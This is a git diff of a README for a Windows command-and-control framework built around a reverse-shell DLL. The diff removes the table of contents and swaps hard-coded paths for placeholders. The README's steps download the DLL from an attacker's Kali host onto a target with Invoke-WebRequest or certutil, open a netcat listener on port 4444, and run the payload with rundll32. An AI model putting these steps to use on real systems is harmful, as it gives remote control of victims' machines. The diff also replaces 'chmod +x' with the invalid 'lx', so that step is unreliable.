@@ -1,24 +1,6 @@
 # 🎯 Shell Reverse DLL - Windows C2 Framework
 
-A complete Command & Control (C2) framework for Windows systems featuring encrypted communication, a web dashboard, and a reverse shell DLL payload.
-
-## 📋 Table of Contents
-
-- [Overview](#overview)
-- [Features](#features)
-- [Project Structure](#project-structure)
-- [Prerequisites](#prerequisites)
-- [Installation](#installation)
-- [Usage](#usage)
-  - [1. Start the C2 Server](#1-start-the-c2-server)
-  - [2. Start the Web Dashboard](#2-start-the-web-dashboard)
-  - [3. Compile the DLL Payload](#3-compile-the-dll-payload)
-  - [4. Deploy on Target Windows Machine](#4-deploy-on-target-windows-machine)
-- [Configuration](#configuration)
-- [Agent Modes](#agent-modes)
-- [Security Features](#security-features)
-- [Troubleshooting](#troubleshooting)
-- [Legal Disclaimer](#legal-disclaimer)
+A complete Command & Control (C2) framework for Windows systems featuring encrypted communication, a web dashboard, and a reverse shell DLL payload.  
 
 ## Overview
 
@@ -85,7 +67,7 @@ pip3 install -r requirements.txt
 
 3. Make scripts executable
 
-chmod +x dll/compile.sh agents/build.sh
+lx dll/compile.sh agents/build.sh
 
 Usage
 1. Start the C2 Server
@@ -127,7 +109,7 @@ python3 -m http.server 8000
 On Windows (download):
 
 # PowerShell
-Invoke-WebRequest -Uri "http://<KALI_IP>:8000/shell_reverse_x64.dll" -OutFile "C:\Temp\shell.dll"
+Invoke-WebRequest -Uri "http://<KALI_IP>:8000/shell_reverse_x64.dll" -OutFile "<FOLDER PATH>\shell.dll"
 
 # OR using certutil
 certutil -urlcache -f http://<KALI_IP>:8000/shell_reverse_x64.dll shell.dll
@@ -147,9 +129,7 @@ nc -lvnp 4444
 
 On Windows:
 
-rundll32.exe C:\Temp\shell.dll,RunShell
-
-
+rundll32.exe <FOLDER PATH>\shell.dll,RunShell
 
 Legal Disclaimer
 ⚠️ WARNING: This tool is for educational purposes only and authorized security testing only.
